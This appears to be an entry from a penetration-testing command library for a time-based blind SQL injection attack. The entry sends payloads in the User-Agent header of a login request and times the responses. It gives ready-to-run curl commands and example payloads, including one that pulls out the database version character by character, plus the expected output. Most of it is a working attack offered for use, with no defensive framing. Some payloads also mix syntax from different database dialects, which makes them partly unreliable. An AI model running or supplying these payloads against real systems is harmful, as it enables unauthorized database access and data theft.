---
data: >-
  curl -X POST $TARGET -H "User-Agent: $PAYLOAD" -d
  "username=test&password=test" -w "%{time_total}\n"
tags:
  - sqli
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.413Z'
id: ea9e8020-f6fa-4c66-84dc-72fc5ebeb97e
verified: false
validated: true
submitted: true
---
# inject-sqli-user-agent

## Command

```bash
curl -X POST $TARGET -H "User-Agent: $PAYLOAD" -d "username=test&password=test" -w "%{time_total}\n"
```

## Description

Sends an HTTP POST request to a login endpoint with a SQL injection payload in the User-Agent header, measuring response time for blind detection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $TARGET | Target URL (e.g., https://example.com/login) | Yes |
| $PAYLOAD | SQL payload (e.g., ' OR IF(1=1, WAITFOR DELAY '0:0:5', 0)-- ) | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: ' OR WAITFOR DELAY '0:0:5'--" -d "username=test&password=test" -w "%{time_total}\n"
```

### Advanced Usage

```bash
curl -X POST https://target.com/login -H "User-Agent: ' OR IF(ASCII(SUBSTRING(@@VERSION,1,1))>64, WAITFOR DELAY '0:0:5', 0)--" -d "username=test&password=test" -w "%{time_total}\n"
```

## Expected Output

HTTP response with total time (e.g., 5.123s) indicating delay on successful injection.

## Related

- [[Related Procedure]]
